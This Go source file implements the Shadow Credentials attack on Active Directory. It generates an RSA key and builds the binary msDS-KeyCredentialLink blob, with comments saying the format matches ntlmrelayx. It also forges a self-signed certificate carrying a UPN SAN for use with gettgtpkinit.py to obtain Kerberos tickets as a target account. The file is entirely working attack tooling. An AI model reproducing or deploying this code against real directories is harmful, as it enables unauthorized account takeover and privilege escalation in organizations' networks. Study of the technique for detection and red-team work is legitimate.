package shadowcreds

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"fmt"
	"math/big"
	"strings"
	"time"

	"github.com/google/uuid"
)

// KeyCredential represents the msDS-KeyCredentialLink structure
type KeyCredential struct {
	privateKey *rsa.PrivateKey
	publicKey  *rsa.PublicKey
	deviceID   uuid.UUID
	keyID      []byte
}

// NewKeyCredential generates a new RSA key pair and KeyCredential
func NewKeyCredential() (*KeyCredential, error) {
	// Generate 2048-bit RSA key
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, fmt.Errorf("failed to generate RSA key: %w", err)
	}

	// Generate device ID
	deviceID, err := uuid.NewRandom()
	if err != nil {
		return nil, fmt.Errorf("failed to generate device ID: %w", err)
	}

	kc := &KeyCredential{
		privateKey: privateKey,
		publicKey:  &privateKey.PublicKey,
		deviceID:   deviceID,
	}

	// Build BCRYPT_RSAKEY_BLOB first
	rsaKeyBlob, err := kc.buildRSAKeyBlob()
	if err != nil {
		return nil, fmt.Errorf("failed to build RSA key blob: %w", err)
	}

	// Compute KeyID as SHA256 of the BCRYPT_RSAKEY_BLOB (matches ntlmrelayx)
	hash := sha256.Sum256(rsaKeyBlob)
	kc.keyID = hash[:]

	return kc, nil
}

// BuildKeyCredentialBlob builds the binary KeyCredential structure
func (kc *KeyCredential) BuildKeyCredentialBlob() ([]byte, error) {
	// Build BCRYPT_RSAKEY_BLOB for RawKeyMaterial
	rawKeyMaterial, err := kc.buildRSAKeyBlob()
	if err != nil {
		return nil, err
	}

	// Properties for hash calculation (WITHOUT KeyIdentifier)
	// This matches ntlmrelayx: only properties 0x3-0x9 are hashed
	propertiesForHash := []property{
		{Type: 0x03, Value: rawKeyMaterial},
		{Type: 0x04, Value: []byte{0x01}},
		{Type: 0x05, Value: []byte{0x00}},
		{Type: 0x06, Value: kc.deviceID[:]},
		{Type: 0x07, Value: []byte{0x01, 0x00}}, // CustomKeyInfo
		{Type: 0x08, Value: fileTimeNow()},      // LastLogonTime
		{Type: 0x09, Value: fileTimeNow()},      // CreationTime
	}

	keyHash := kc.calculateKeyHash(propertiesForHash)

	// All properties for final output (KeyIdentifier + KeyHash + rest)
	allProperties := []property{
		{Type: 0x01, Value: kc.keyID},
		{Type: 0x02, Value: keyHash},
		{Type: 0x03, Value: rawKeyMaterial},
		{Type: 0x04, Value: []byte{0x01}},
		{Type: 0x05, Value: []byte{0x00}},
		{Type: 0x06, Value: kc.deviceID[:]},
		{Type: 0x07, Value: []byte{0x01, 0x00}}, // CustomKeyInfo
		{Type: 0x08, Value: fileTimeNow()},      // LastLogonTime
		{Type: 0x09, Value: fileTimeNow()},      // CreationTime
	}

	blob := make([]byte, 4)
	binary.LittleEndian.PutUint32(blob, 0x00000200)

	for _, prop := range allProperties {
		propBytes := prop.Marshal()
		blob = append(blob, propBytes...)
	}

	return blob, nil
}

// property represents a KeyCredential property
type property struct {
	Type  byte
	Value []byte
}

// Marshal marshals a property to bytes
func (p *property) Marshal() []byte {
	buf := make([]byte, 3+len(p.Value))
	binary.LittleEndian.PutUint16(buf[0:2], uint16(len(p.Value)))
	buf[2] = p.Type
	copy(buf[3:], p.Value)
	return buf
}

// buildRSAKeyBlob builds a BCRYPT_RSAKEY_BLOB
func (kc *KeyCredential) buildRSAKeyBlob() ([]byte, error) {
	pubKey := kc.publicKey

	// Convert exponent to bytes (big-endian, minimal representation like Python's long_to_bytes)
	expBigInt := big.NewInt(int64(pubKey.E))
	expBuf := expBigInt.Bytes()

	// Convert modulus to bytes (big-endian, like Python's long_to_bytes)
	modBytes := pubKey.N.Bytes()

	// BCRYPT_RSAKEY_BLOB header
	blob := make([]byte, 24)
	binary.LittleEndian.PutUint32(blob[0:4], 0x31415352)              // Magic: "RSA1"
	binary.LittleEndian.PutUint32(blob[4:8], 2048)                    // BitLength (key size in bits)
	binary.LittleEndian.PutUint32(blob[8:12], uint32(len(expBuf)))    // cbPublicExp
	binary.LittleEndian.PutUint32(blob[12:16], uint32(len(modBytes))) // cbModulus
	binary.LittleEndian.PutUint32(blob[16:20], 0)                     // cbPrime1 (not used for public key)
	binary.LittleEndian.PutUint32(blob[20:24], 0)                     // cbPrime2 (not used for public key)

	blob = append(blob, expBuf...)
	blob = append(blob, modBytes...)

	return blob, nil
}

// calculateKeyHash calculates SHA256 of serialized properties
func (kc *KeyCredential) calculateKeyHash(props []property) []byte {
	var data []byte
	for _, prop := range props {
		data = append(data, prop.Marshal()...)
	}
	hash := sha256.Sum256(data)
	return hash[:]
}

// fileTimeNow returns current time as Windows FILETIME (8 bytes)
func fileTimeNow() []byte {
	const ticksPerSecond = 10000000
	const epochDiff = 11644473600

	now := time.Now().Unix()
	filetime := (now + epochDiff) * ticksPerSecond

	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, uint64(filetime))
	return buf
}

// GenerateCertificate generates a self-signed X.509 certificate with UPN SAN extension
// for use with gettgtpkinit.py. The domain parameter should be the AD domain (e.g., "domain.local")
func (kc *KeyCredential) GenerateCertificate(username string, domain string) (*x509.Certificate, error) {
	// Build UPN: username@domain
	upn := username + "@" + strings.ToLower(domain)

	// Build UPN otherName SAN extension
	// OID 1.3.6.1.4.1.311.20.2.3 is the Microsoft UPN OID
	// Structure:
	// SEQUENCE {
	//   [0] {              # otherName context tag
	//     OBJECT           # UPN OID
	//     [0] {            # Explicit tag
	//       UTF8STRING     # UPN value
	//     }
	//   }
	// }
	upnOID := []byte{
		0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03,
	}
	upnValue := []byte(upn)

	// Build the UTF8STRING
	utf8Tag := append([]byte{0x0C, byte(len(upnValue))}, upnValue...)
	// Wrap in explicit [0] tag
	explicitTag := append([]byte{0xA0, byte(len(utf8Tag))}, utf8Tag...)
	// Concatenate OID and explicit tag
	otherNameContent := append(upnOID, explicitTag...)
	// Wrap in [0] context tag for otherName
	otherName := append([]byte{0xA0, byte(len(otherNameContent))}, otherNameContent...)
	// Wrap in SEQUENCE for SAN extension value
	sanValue := append([]byte{0x30, byte(len(otherName))}, otherName...)

	template := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName: username,
		},
		NotBefore:   time.Now().Add(-40 * 365 * 24 * time.Hour), // Valid from 40 years ago
		NotAfter:    time.Now().Add(40 * 365 * 24 * time.Hour),  // Valid for 40 years
		KeyUsage:    x509.KeyUsageDigitalSignature,              // DigitalSignature for PKINIT client auth
		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		ExtraExtensions: []pkix.Extension{
			{
				Id:       []int{2, 5, 29, 17}, // SAN OID
				Critical: false,
				Value:    sanValue,
			},
		},
	}

	certBytes, err := x509.CreateCertificate(rand.Reader, template, template, kc.publicKey, kc.privateKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create certificate: %w", err)
	}

	cert, err := x509.ParseCertificate(certBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse certificate: %w", err)
	}

	return cert, nil
}

// PrivateKey returns the RSA private key
func (kc *KeyCredential) PrivateKey() *rsa.PrivateKey {
	return kc.privateKey
}
